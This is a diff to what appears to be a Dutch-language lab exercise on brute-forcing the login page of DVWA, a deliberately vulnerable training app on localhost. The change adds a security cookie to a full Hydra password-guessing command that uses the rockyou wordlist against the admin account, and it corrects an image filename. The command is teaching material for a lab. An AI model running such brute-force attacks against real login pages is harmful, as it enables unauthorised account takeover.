@@ -43,9 +43,9 @@ Welk bericht krijg je te zien als het niet lukt om in te loggen? Kies één woor
 ## Commando invullen
 Kopieer onderstaand commando en vervang: `USERVELDNAAM`, `PASSWORDVELDNAAM`, `SESSION_ID` en `FOUTMELDING`. Verander alleen die vier onderdelen. Draai vervolgens het commando.
 ```
-hydra -l admin -P /usr/share/wordlists/rockyou.txt -m '/DVWA/vulnerabilities/brute/:USERVELDNAAM=^USER^&PASSWORDVELDNAAM=^PASS^&Login=Login:H=Cookie:PHPSESSID=SESSION_ID:F=FOUTMELDING' localhost http-get-form
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -m '/DVWA/vulnerabilities/brute/:USERVELDNAAM=^USER^&PASSWORDVELDNAAM=^PASS^&Login=Login:H=Cookie:PHPSESSID=SESSION_ID;security=low:F=FOUTMELDING' localhost http-get-form
 ```
 
 Als het goed gaat, zie je:
 
-![succes](low_succes.png)
+![succes](low_success.png)
